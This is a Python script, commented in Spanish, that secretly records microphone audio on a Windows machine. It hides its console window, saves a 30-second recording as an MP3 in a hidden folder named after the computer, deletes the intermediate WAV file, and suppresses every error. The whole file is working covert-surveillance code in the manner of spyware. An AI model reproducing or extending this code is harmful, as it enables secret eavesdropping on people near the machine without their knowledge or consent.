import os
import subprocess
import platform
import threading
import time
import ctypes
import sys

def hide_console():
    """Oculta la ventana de la consola usando ctypes en sistemas Windows."""
    if sys.platform == 'win32':
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def make_folder_hidden(folder_path):
    """Establece una carpeta como oculta en las propiedades."""
    if platform.system() == 'Windows':
        try:
            ctypes.windll.kernel32.SetFileAttributesW(folder_path, 2)  # 2 = FILE_ATTRIBUTE_HIDDEN
        except Exception as e:
            pass  # Si ocurre un error, simplemente lo ignoramos

def record_audio(wav_file_path, stop_event):
    """Graba audio y lo guarda en un archivo .wav hasta que se activa el stop_event."""
    import sounddevice as sd
    import wave

    fs = 44100  # Hz
    channels = 1  # Grabar en mono
    dtype = 'int16'
    latency = 'low'
    blocksize = 1024

    try:
        with wave.open(wav_file_path, 'wb') as wf:
            wf.setnchannels(channels)
            wf.setsampwidth(2)
            wf.setframerate(fs)

            def callback(indata, frames, time_info, status):
                if stop_event.is_set():
                    raise sd.CallbackAbort  # Detener grabación sin error
                if status:
                    pass  # Silenciar el status si se quiere sin logueo
                wf.writeframes(indata.copy())

            with sd.InputStream(samplerate=fs, channels=channels, dtype=dtype,
                                latency=latency, blocksize=blocksize, callback=callback):
                while not stop_event.is_set():
                    time.sleep(0.1)

    except sd.CallbackAbort:
        pass  # Detenido por evento
    except Exception as e:
        pass  # Si ocurre un error, lo ignoramos

def convert_to_mp3(wav_file_path, mp3_file_path):
    """Convierte un archivo .wav a .mp3 usando FFmpeg."""
    try:
        subprocess.run(["ffmpeg", "-y", "-i", wav_file_path, mp3_file_path],
                       check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except subprocess.CalledProcessError:
        pass  # Error silencioso

def main():
    hide_console()  # Ocultar la consola

    # Detectar el directorio del script
    script_dir = os.path.abspath(os.path.dirname(__file__))
    os.chdir(script_dir)  # Cambiar al directorio del script

    computer_name = platform.node()
    folder_name = f"AUDIO-{computer_name}"

    folder_path = os.path.join(script_dir, folder_name)  # Ruta de la carpeta en el directorio del script
    if not os.path.exists(folder_path):
        os.makedirs(folder_path)
        make_folder_hidden(folder_path)  # Hacer la carpeta oculta

    wav_file = os.path.join(folder_path, "grabacion.wav")
    mp3_file = os.path.join(folder_path, f"audio_{computer_name}.mp3")

    stop_event = threading.Event()

    # Iniciar grabación en un hilo
    recording_thread = threading.Thread(target=record_audio, args=(wav_file, stop_event))
    recording_thread.daemon = True  # Permite que el hilo se cierre cuando el script termine
    recording_thread.start()

    # Simular grabación durante un tiempo determinado, por ejemplo, 30 segundos
    time.sleep(30)  # Tiempo de grabación
    stop_event.set()  # Detener la grabación

    # Esperar a que el hilo termine
    recording_thread.join()

    # Convertir a MP3
    convert_to_mp3(wav_file, mp3_file)

    # Eliminar archivo WAV después de la conversión
    try:
        if os.path.exists(wav_file):
            os.remove(wav_file)
    except Exception:
        pass  # Ignorar errores al eliminar el archivo

if __name__ == "__main__":
    main()
